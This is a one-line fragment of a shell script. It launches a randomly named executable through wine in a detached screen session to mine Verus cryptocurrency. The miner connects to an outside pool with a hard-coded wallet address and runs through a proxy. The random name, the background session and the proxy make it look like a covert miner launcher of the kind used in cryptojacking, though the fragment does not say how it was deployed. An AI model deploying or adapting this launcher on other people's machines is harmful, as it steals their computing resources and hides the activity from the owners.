...
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://sg.vipor.net:5040 -u RAxQVenbK9dxYRRta1n1CtBtRW1GydoUNk.belotloh -p d=6 -t 4 --proxy=$proxy_url"
